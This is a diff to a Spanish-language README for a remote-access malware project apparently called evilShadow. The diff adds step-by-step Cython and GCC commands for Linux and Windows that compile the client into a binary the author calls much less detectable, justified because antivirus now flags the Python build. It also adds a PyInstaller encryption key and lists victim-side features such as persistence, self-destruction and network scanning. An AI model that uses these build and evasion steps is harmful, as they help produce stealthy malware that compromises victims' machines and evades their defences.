@@ -5,14 +5,9 @@
 
 # Novedades
 
+- Transformar de **.py** a **.c** 
 - Autodestrucción
-- Code Obfuscation
-- Buscar TODOS los archivos por extension del sistema
-- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (Mejorado (en mejora)).
-- Escanear la red de la victima
-
-# Proximamente 
-- Port Forwarding (tener conexion con los otros hosts)
+- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (Mejorado (en mejora)). 
 
 # Functions
 (N/A) -> Not Implemented yet
@@ -69,57 +64,97 @@
                     ---------------------------------------------------------
 ```
 
+# Información
+**A dia hoy (22/10/2023) este malware compilado a través de python ya es detectado por los antivirus...**
+
+Por esa rázon: Recomendablemente: [**Compilacion C**](#c-compilation)
+
+- C Compiler:
+ 
+  ![image](https://github.com/an0mal1a/DarkSpecter/assets/129337574/051efa16-1ba2-4bd0-b87a-e55d3614eafa)
+
+
+- Python compilers:
+
+  ![image](https://github.com/an0mal1a/evilShadow/assets/129337574/bebf87b6-29f2-4bc7-bb69-683cb7fbc500)
+
+
+   
 # Requirements
 
 - Microsoft Visual C++ 14.0 or greater
   - https://visualstudio.microsoft.com/visual-cpp-build-tools
+  
     ![image](https://github.com/an0mal1a/evilShadow/assets/129337574/dcb0d725-15c4-4453-b5c4-4b295a38fedc)
 
-
-Automated:
 
 - ```pip install -r requirements.txt```
 
 # Errors:
 
 - Si tenemos errores con las librerias (module not found):
-  - ```pip install nmap_vscan_fix prompt_toolkit colorama cryptography requests pynput certifi cffi charset-normalizer idna Pillow psutil pycparser requests six urllib3 pyinstaller ``` 
-
-
-# Compile Obfuscated Code
-
-### Set IP address
-
-- En el archivo **conection-obf.py** en la línea **253** modificamos la IP a la que deseemos:
-
-        sock .connect (('127.0.0.1',2457 ))
-
-- Con Pyinstaller, ejecutamos el siguiente comando:
-  - Automated:
-        
-        pyinstaller ObfusquedTest.spec
-
-  - Manual
-
-        pyinstaller --onefile --noconsole --noupx --strip --clean -n ObfusquedTest conection-obf.py
-
-#### Virus Total Obfuscated Restults:
-![image](https://github.com/an0mal1a/evilShadow/assets/129337574/28f91103-7cc8-44e4-b305-24706ec77fa5)
+  - ```pip install nmap_vscan_fix prompt_toolkit colorama cryptography requests pynput certifi cffi charset-normalizer idna Pillow psutil pycparser requests six urllib3 pyinstaller cython ``` 
 
 
 
-Hash: c5d1b9944e5233f40de7bd3891080a1e434201465c085d2d4712da22e2b02ae3
-
-# Compile Normal Code
+# C Compilation (Recomended)
 
 
-#### Virus Total **NO** Obfuscated Restults:
-![image](https://github.com/an0mal1a/evilShadow/assets/129337574/437944d4-c060-4ef8-8b44-beca7a787458)
+Vamos a ver el proceso para transformar el .py a .c y compilarlo a nivel de C con **GCC**
+
+- **¿Por Que?**
+  - La repuesta es simple, esto nos genera un binario MUCHO mas ligero y MUCHO menos detectable
+
+El proceso es un poco complejo, pero vale la pena...
+
+## **Linux**
+  Una vez instalado los requirements de python, ejecutamos el siguiente comando para que la compilacion en C funcione correctamente
+
+  - Requirements: `sudo apt install python3-dev build-essential python3-pip`  
+  
+  - Manul Compilation:
+
+    1. Generate source .c from .py 
+          
+           python3 -m cython --embed -o client/connection.c client/connectionC.py
+    2. Set required parameters 
+    
+           PYTHONLIBVER=python$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')$(python3-config --abiflags); INCLUDEPATH=$(python3 -c "import sysconfig; print(sysconfig.get_path('include'))")
+    3. Compile: 
+    
+           gcc -Os -I$INCLUDEPATH client/connection.c -o MalwareBinLinux $(python3-config --ldflags) -l$PYTHONLIBVER
+
+  - Automated Comilation:
+
+        ┌──(supervisor㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/Malware/evilShadow]
+        └─$ ./autoCcompile.py
 
 
+## Windows
 
-HASH: 5647db99e3333218c973524b9b0f6deea7c7c48930e09046cadb40d2e44ffe08
+  - Requirements:
+    - GCC: MinGW 64 Bits [DOWNLOAD LINK](https://github.com/brechtsanders/winlibs_mingw/releases/download/13.2.0mcf-16.0.6-11.0.1-ucrt-r2/winlibs-x86_64-mcf-seh-gcc-13.2.0-llvm-16.0.6-mingw-w64ucrt-11.0.1-r2.7z)
+      
+      Es necesario descargar GCC de **64bits** [Main Page](https://winlibs.com/)
 
+![img](https://github.com/an0mal1a/evilShadow/assets/129337574/a914ecf1-cc25-4d1b-b986-a1210a817868)
+
+
+  - Manual compilation:
+
+    1. Generate source .c from .py 
+    
+            python -m cython --embed -o client/connection.c client/connectionC.py
+    2. Compile With Parameters **POWERSHELL**
+
+            gcc -mwindows -municode -DMS_WIN64 client\connection.c -o MalwareBinWin -L $(python -c "import os, sysconfig; print(os.path.join(sysconfig.get_path('data'), 'libs'))") -I $(python -c "import sysconfig; print(sysconfig.get_path('include'))") -l python$(python -c 'import sys; print(\".\".join(map(str, sys.version_info[:2])).replace(\".\",\"\"))')
+
+
+  - Automated Compilation:
+
+        PS D:\ProtectosPython\ETHICAL_HACKING\Malware\evilShadow> .\autoCcompile.py
+
+# Python Compilation Code (No recomended)
 
 ### Set IP address
 
@@ -141,18 +176,18 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 
   - Admin Required:
   
-      `client>pyinstaller --onefile --noupx --strip --noconsole --clean --uac-admin -n "NoObfusquedTest" conection.py`
+      `client>pyinstaller --onefile --key=Ex4mpl3KeyF0rM4lWar3 --noupx --strip --noconsole --clean --uac-admin -n "NoObfusquedTest" conection.py`
 
   - **NO** Admin Required:
   
-      `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`
+      `client>pyinstaller --onefile --key=Ex4mpl3KeyF0rM4lWar3 --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`
 
   ### Linux:
   
-    `client>pyinstaller --onefile --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`
+    `client>pyinstaller --onefile --key=Ex4mpl3KeyF0rM4lWar3 --noupx --strip --noconsole --clean -n "NoObfusquedTest" conection.py`
 
 
-# Funciones (EXPLICAIÓN)
+# Funciones (EXPLICACIÓN)
 
 TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
     (av, search <ext>, startTask, check, sysinfo, persistence, lowsersistence, scanhost <host>)
@@ -428,5 +463,3 @@ TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
 
   - **exit**
     - Close the conecction
-
-For suggeriments or problems to fix --> https://github.com/an0mal1a/evilShadow/issues
